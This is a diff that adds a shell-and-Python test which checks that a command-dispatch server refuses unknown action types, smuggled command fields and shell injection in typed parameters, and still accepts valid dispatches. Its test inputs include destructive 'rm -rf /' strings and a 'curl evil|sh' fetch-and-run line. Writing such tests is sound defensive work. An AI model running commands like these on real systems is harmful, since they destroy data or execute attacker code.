@@ -349,3 +349,87 @@ gjget() { "$PY" -c "import json; print(json.load(open('$GATE_OUT')).get('$1'))";
 [ "$(gjget nongated_dispatched)" = "True" ] && [ "$(gjget nongated_in_queue)" = "False" ] \
   && ok "#3 a NON-gated action dispatches immediately (the gate is selective)" \
   || bad "#3 a non-gated action was wrongly queued"
+
+# ──────────────────────────────────────────────────────────────────────────────
+# #4 ALLOWLIST REFUSAL (CARDINAL, §1) — an arbitrary-command dispatch (unknown
+#    action_type / a smuggled `cmd` field / a shell payload jammed into a typed
+#    param) is REFUSED (422 + an audit dispatch_refused row), runs NOTHING. A VALID
+#    allowlisted dispatch SUCCEEDS. Falsifiable: a build that let arbitrary through
+#    (a free-string param / a command field) reds this — proven by the valid half.
+# ──────────────────────────────────────────────────────────────────────────────
+echo
+echo "#4 ALLOWLIST REFUSAL (arbitrary command REFUSED; valid succeeds, §1) [CARDINAL]"
+
+REFUSE_OUT="$WORK/refuse.out"
+LIB="$LIB" "$PY" - >"$REFUSE_OUT" 2>"$WORK/refuse.err" <<'PYEOF'
+import json, os, sys
+sys.path.insert(0, os.environ["LIB"])
+import cp_server as S
+import cp_auth as K
+import cp_audit as Au
+home = os.environ["HEIMDALL_HOME"]
+ident = K.Identity("haid:rj.mbp-7f3a", owner=True)
+out = {}
+
+# count dispatch_refused rows BEFORE so we assert the refusals wrote NEW audit rows.
+out["refused_before"] = len(Au.search(event="dispatch_refused", home=home))
+
+# (a) UNKNOWN action_type — the server runs ONLY allowlisted types, never a string.
+r_unknown = S.dispatch(ident, "shell", {"cmd": "rm -rf /"}, home=home)
+out["unknown_status"] = r_unknown.status            # 422
+out["unknown_reason"] = r_unknown.body.get("reason")  # unknown_action
+
+# (b) a COMMAND SMUGGLED as an extra field alongside a valid param — refused on the
+#     extra key BEFORE any handler is reached (the command-smuggle wall).
+r_smug = S.dispatch(ident, "run-task-X", {"task_id": "build-x", "cmd": "curl evil|sh"}, home=home)
+out["smuggle_status"] = r_smug.status               # 422
+out["smuggle_reason"] = r_smug.body.get("reason")   # extra_param
+
+# (c) a SHELL PAYLOAD jammed INTO a typed param — refused on the whitelist pattern
+#     ("; rm -rf /" never matches an id-shaped slug).
+r_pay = S.dispatch(ident, "run-task-X", {"task_id": "; rm -rf /"}, home=home)
+out["payload_status"] = r_pay.status                # 422
+out["payload_reason"] = r_pay.body.get("reason")    # bad_param
+
+# (d) THE VALID HALF — a real allowlisted dispatch SUCCEEDS. This is what makes the
+#     refusal falsifiable: refuse-arbitrary is distinct from refuse-everything.
+r_ok = S.dispatch(ident, "run-task-X", {"task_id": "real-task"}, home=home)
+out["valid_status"] = r_ok.status                   # 200
+out["valid_dispatched"] = r_ok.body.get("dispatched")
+
+# each refusal wrote an audit dispatch_refused row (the security record — assertion #7).
+out["refused_after"] = len(Au.search(event="dispatch_refused", home=home))
+# and EACH refusal carries a server-minted audit_id (it was recorded, not silent).
+out["refusals_have_audit_ids"] = all(
+    bool(r.audit_id) for r in (r_unknown, r_smug, r_pay))
+
+sys.stdout.write(json.dumps(out))
+PYEOF
+
+[ -s "$REFUSE_OUT" ] || { echo "FATAL: refusal harness produced no output" >&2; cat "$WORK/refuse.err" >&2; exit 2; }
+rjget() { "$PY" -c "import json; print(json.load(open('$REFUSE_OUT')).get('$1'))"; }
+
+[ "$(rjget unknown_status)" = "422" ] && [ "$(rjget unknown_reason)" = "unknown_action" ] \
+  && ok "#4 unknown action_type ('shell' + cmd) -> 422 unknown_action (NEVER an arbitrary command)" \
+  || bad "#4 unknown action_type not refused"
+[ "$(rjget smuggle_status)" = "422" ] && [ "$(rjget smuggle_reason)" = "extra_param" ] \
+  && ok "#4 a smuggled cmd field -> 422 extra_param (refused before any handler)" \
+  || bad "#4 smuggled cmd not refused"
+[ "$(rjget payload_status)" = "422" ] && [ "$(rjget payload_reason)" = "bad_param" ] \
+  && ok "#4 a shell payload in a typed param -> 422 bad_param (whitelist pattern wall)" \
+  || bad "#4 shell payload in param not refused"
+[ "$(rjget valid_status)" = "200" ] && [ "$(rjget valid_dispatched)" = "True" ] \
+  && ok "#4 a VALID allowlisted dispatch SUCCEEDS (200, dispatched)" \
+  || bad "#4 a valid dispatch did not succeed"
+RB="$(rjget refused_before)"; RA="$(rjget refused_after)"
+[ "${RA:-0}" -ge "$(( ${RB:-0} + 3 ))" ] \
+  && ok "#4 each refusal wrote a dispatch_refused audit row (+$(( RA - RB )))" \
+  || bad "#4 refusals did not all write audit rows ($RB -> $RA)"
+[ "$(rjget refusals_have_audit_ids)" = "True" ] && ok "#4 every refusal carries a server-minted audit_id (recorded, not silent)" || bad "#4 a refusal was not audited"
+# FALSIFIABILITY: arbitrary refused WHILE valid succeeds — refuse-arbitrary != refuse-all.
+if [ "$(rjget unknown_status)" = "422" ] && [ "$(rjget smuggle_status)" = "422" ] \
+   && [ "$(rjget payload_status)" = "422" ] && [ "$(rjget valid_status)" = "200" ]; then
+  ok "#4 FALSIFIABLE: refuse-arbitrary is DISTINCT from refuse-everything (a leak would RED here)"
+else
+  bad "#4 not falsifiable (arbitrary + valid did not distinguish)"
+fi
